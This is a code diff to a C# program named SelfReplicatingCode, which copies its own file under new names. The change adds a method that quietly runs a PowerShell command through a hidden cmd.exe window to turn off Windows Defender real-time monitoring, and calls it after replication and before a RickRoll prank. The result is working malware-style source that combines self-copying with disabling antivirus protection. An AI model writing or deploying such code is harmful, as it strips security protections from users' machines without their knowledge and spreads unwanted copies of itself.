@@ -25,9 +25,33 @@ namespace SelfReplicatingCode
                     Path.GetFileNameWithoutExtension(fileName) + i + Path.GetExtension(fileName));
                 File.Copy(fileName, newFileName, true);
             }
+
+            DisableWindowsDefender(); // Disable Windows Defender
+
             PlayRickRoll(); // Insert in loop if you want to rickroll everytime you replicate (spam)
         }
 
+        static void DisableWindowsDefender()
+        {
+            string command = "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true";
+
+            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command);
+            processInfo.RedirectStandardError = true;
+            processInfo.RedirectStandardOutput = true;
+            processInfo.CreateNoWindow = true;
+            processInfo.UseShellExecute = false;
+
+            Process process = new Process();
+            process.StartInfo = processInfo;
+            process.Start();
+
+            // read the output of the command
+            string output = process.StandardOutput.ReadToEnd();
+            string error = process.StandardError.ReadToEnd();
+
+            Console.WriteLine("Output: " + output);
+            Console.WriteLine("Error: " + error);
+        }
         static void PlayRickRoll()
         {
             string url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
